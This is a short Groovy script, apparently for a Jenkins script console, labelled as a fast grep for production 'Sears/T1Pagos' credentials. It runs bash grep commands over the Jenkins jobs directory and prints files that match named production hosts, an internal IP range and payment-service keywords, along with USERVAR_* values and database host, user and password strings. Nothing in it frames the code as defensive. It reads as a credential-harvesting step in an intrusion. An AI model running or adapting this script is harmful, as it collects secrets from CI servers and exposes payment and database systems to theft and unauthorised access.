// MICRO-B: Fast grep for PROD Sears/T1Pagos creds in Jenkins jobs
def run = { cmd ->
    def p = ["bash", "-c", cmd].execute()
    p.waitForOrKill(25000)
    def out = p.inputStream.text
    def err = p.errorStream.text
    [out: out.take(4000), err: err.take(200)]
}

println "=== FILES WITH PROD KEYWORDS ==="
def r1 = run('grep -rl "dbasears\\|172.27.141\\|apifincadob\\|mrc-services\\|t1pago\\|payment_t1\\|app_t1" /var/jenkins_home/jobs/ 2>/dev/null')
println r1.out ?: "(none found)"

println "\n=== USERVAR_* VALUES IN JOB CONFIGS ==="
def r2 = run('grep -roh "USERVAR_[A-Z_]*=[^<\"]*" /var/jenkins_home/jobs/ 2>/dev/null | sort -u')
println r2.out ?: "(none found)"

println "\n=== DB STRINGS IN JOB CONFIGS ==="
def r3 = run('grep -rih "db_host\\|db_pass\\|db_user\\|database.*host\\|mysql.*pass" /var/jenkins_home/jobs/ 2>/dev/null | grep -v "^Binary" | head -40')
println r3.out ?: "(none found)"

println "\n=== DONE MICRO-B ==="
